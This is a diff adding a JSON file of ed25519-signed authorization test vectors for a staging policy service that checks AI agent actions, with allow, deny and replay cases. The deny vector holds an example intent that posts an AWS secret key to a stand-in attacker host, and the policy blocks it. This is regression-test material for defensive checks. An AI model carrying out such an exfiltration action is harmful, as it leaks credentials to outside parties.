@@ -1,0 +1,93 @@
+{
+  "version": 1,
+  "kid": "sift-staging-2026-04-15-a",
+  "algorithm": "ed25519",
+  "encoding": "base64url-no-padding",
+  "canonicalization": "json.dumps(payload, sort_keys=True, separators=(',', ':'), ensure_ascii=True)",
+  "preimage_rule": "AuthorizationV1 with signature.alg + signature.kid present, signature.sig key absent from the object",
+  "jwks_url": "https://sift-staging.walkosystems.com/sift-jwks.json",
+  "krl_url": "https://sift-staging.walkosystems.com/sift-krl.json",
+  "issuer_endpoint": "https://sift-staging.walkosystems.com/api/v1/authorize",
+  "generated_at": "2026-04-15T09:30:00Z",
+  "note": "These vectors are stable across regenerations as long as the staging signing key (kid above) is unchanged. They are used as a regression suite for byte-level canonicalization parity between issuer and verifier.",
+  "vectors": [
+    {
+      "name": "allow-low-risk-read",
+      "description": "Read-only access to a low-sensitivity file. Policy permits all read-only ops on /etc/hostname under the read-only-low-risk policy.",
+      "intent_text": "action=read path=/etc/hostname mode=ro",
+      "state_text": "fs_snapshot=2026-04-16T00:00:00Z agent=oxdeai-test",
+      "preimage": "{\"audience\":\"oxdeai-pep-staging\",\"auth_id\":\"vec-allow-001\",\"decision\":\"ALLOW\",\"expires_at\":1776600300,\"intent_hash\":\"cb5e98e22ac052134d60f0d6b25fd74ff44441204137d0411dd8881c9bb475e2\",\"issued_at\":1776600000,\"issuer\":\"sift-staging.walkosystems.com\",\"policy_id\":\"read-only-low-risk\",\"signature\":{\"alg\":\"ed25519\",\"kid\":\"sift-staging-2026-04-15-a\"},\"state_hash\":\"8ed008196f65e2cf4fadd68975ac140d36ddd1b98b509d1018487eaeccc5bf1b\",\"version\":\"AuthorizationV1\"}",
+      "preimage_sha256_hex": "4f213fc4f70bdf936b47e6b5822fb63bfc59daf50ccadb2a47bb7cbd53c76616",
+      "expected_signature_b64u": "24Fj6PzR4NALvYDck5__D2LJYBWO1IZ3E6C0fRTao-kSHkbNRUEYPCAk9LALEji04yhYIyestVj2t5idtcUzCA",
+      "signed_payload": {
+        "audience": "oxdeai-pep-staging",
+        "auth_id": "vec-allow-001",
+        "decision": "ALLOW",
+        "expires_at": 1776600300,
+        "intent_hash": "cb5e98e22ac052134d60f0d6b25fd74ff44441204137d0411dd8881c9bb475e2",
+        "issued_at": 1776600000,
+        "issuer": "sift-staging.walkosystems.com",
+        "policy_id": "read-only-low-risk",
+        "signature": {
+          "alg": "ed25519",
+          "kid": "sift-staging-2026-04-15-a",
+          "sig": "24Fj6PzR4NALvYDck5__D2LJYBWO1IZ3E6C0fRTao-kSHkbNRUEYPCAk9LALEji04yhYIyestVj2t5idtcUzCA"
+        },
+        "state_hash": "8ed008196f65e2cf4fadd68975ac140d36ddd1b98b509d1018487eaeccc5bf1b",
+        "version": "AuthorizationV1"
+      }
+    },
+    {
+      "name": "deny-credential-exfiltration",
+      "description": "Outbound POST to an unknown host with credential material in the body. Blocked by data-exfil-block policy.",
+      "intent_text": "action=http_post url=https://attacker.example.com/collect body=AWS_SECRET_ACCESS_KEY=AKIA...",
+      "state_text": "fs_snapshot=2026-04-16T00:00:00Z agent=oxdeai-test",
+      "preimage": "{\"audience\":\"oxdeai-pep-staging\",\"auth_id\":\"vec-deny-001\",\"decision\":\"DENY\",\"expires_at\":1776600060,\"intent_hash\":\"61659fd4ba5cb8cb195390d3cb3dd8a678fccfd180980f37b2774158a3df11ad\",\"issued_at\":1776600000,\"issuer\":\"sift-staging.walkosystems.com\",\"policy_id\":\"data-exfil-block\",\"signature\":{\"alg\":\"ed25519\",\"kid\":\"sift-staging-2026-04-15-a\"},\"state_hash\":\"8ed008196f65e2cf4fadd68975ac140d36ddd1b98b509d1018487eaeccc5bf1b\",\"version\":\"AuthorizationV1\"}",
+      "preimage_sha256_hex": "f04bc74def9643f44007507d1022f7610c8f6e5cdf82f5084ce3c95aa15f6aa9",
+      "expected_signature_b64u": "KbK4A8rp7uCAsWXOM5j-J_5b2-tbsz_b1CMLmgipRzTqFXHU7_rtzHXQOvn8KwnQdn54y2UBBYhD3TWMisHDAQ",
+      "signed_payload": {
+        "audience": "oxdeai-pep-staging",
+        "auth_id": "vec-deny-001",
+        "decision": "DENY",
+        "expires_at": 1776600060,
+        "intent_hash": "61659fd4ba5cb8cb195390d3cb3dd8a678fccfd180980f37b2774158a3df11ad",
+        "issued_at": 1776600000,
+        "issuer": "sift-staging.walkosystems.com",
+        "policy_id": "data-exfil-block",
+        "signature": {
+          "alg": "ed25519",
+          "kid": "sift-staging-2026-04-15-a",
+          "sig": "KbK4A8rp7uCAsWXOM5j-J_5b2-tbsz_b1CMLmgipRzTqFXHU7_rtzHXQOvn8KwnQdn54y2UBBYhD3TWMisHDAQ"
+        },
+        "state_hash": "8ed008196f65e2cf4fadd68975ac140d36ddd1b98b509d1018487eaeccc5bf1b",
+        "version": "AuthorizationV1"
+      }
+    },
+    {
+      "name": "replay-stale-nonce",
+      "description": "Replay attempt: nonce previously authorized at issued_at-3600s. Boundary rejects under replay-window-violation; ttl is 0 because the decision is terminal.",
+      "intent_text": "action=read path=/etc/hostname mode=ro",
+      "state_text": "nonce_seen_at=1776596400 original_auth_id=vec-allow-001",
+      "preimage": "{\"audience\":\"oxdeai-pep-staging\",\"auth_id\":\"vec-replay-001\",\"decision\":\"REPLAY\",\"expires_at\":1776600000,\"intent_hash\":\"cb5e98e22ac052134d60f0d6b25fd74ff44441204137d0411dd8881c9bb475e2\",\"issued_at\":1776600000,\"issuer\":\"sift-staging.walkosystems.com\",\"policy_id\":\"replay-window-violation\",\"signature\":{\"alg\":\"ed25519\",\"kid\":\"sift-staging-2026-04-15-a\"},\"state_hash\":\"5a067228e545bd9749b20a9be92f72e31e0ae1273ab7f93475a2a3fba1965977\",\"version\":\"AuthorizationV1\"}",
+      "preimage_sha256_hex": "b2a3fdfd4060054ce8cddb0edb4565fef366e4c68be5a0ed02df092632a2024d",
+      "expected_signature_b64u": "rTT-t_7w68iC4pW4dtt3Kto8CqqjMrzbVJHILjbwcCzEtIiOrEz3TVjnEsarbMY9TqIgfGtEfr6rtmtBHS0MBw",
+      "signed_payload": {
+        "audience": "oxdeai-pep-staging",
+        "auth_id": "vec-replay-001",
+        "decision": "REPLAY",
+        "expires_at": 1776600000,
+        "intent_hash": "cb5e98e22ac052134d60f0d6b25fd74ff44441204137d0411dd8881c9bb475e2",
+        "issued_at": 1776600000,
+        "issuer": "sift-staging.walkosystems.com",
+        "policy_id": "replay-window-violation",
+        "signature": {
+          "alg": "ed25519",
+          "kid": "sift-staging-2026-04-15-a",
+          "sig": "rTT-t_7w68iC4pW4dtt3Kto8CqqjMrzbVJHILjbwcCzEtIiOrEz3TVjnEsarbMY9TqIgfGtEfr6rtmtBHS0MBw"
+        },
+        "state_hash": "5a067228e545bd9749b20a9be92f72e31e0ae1273ab7f93475a2a3fba1965977",
+        "version": "AuthorizationV1"
+      }
+    }
+  ]
+}
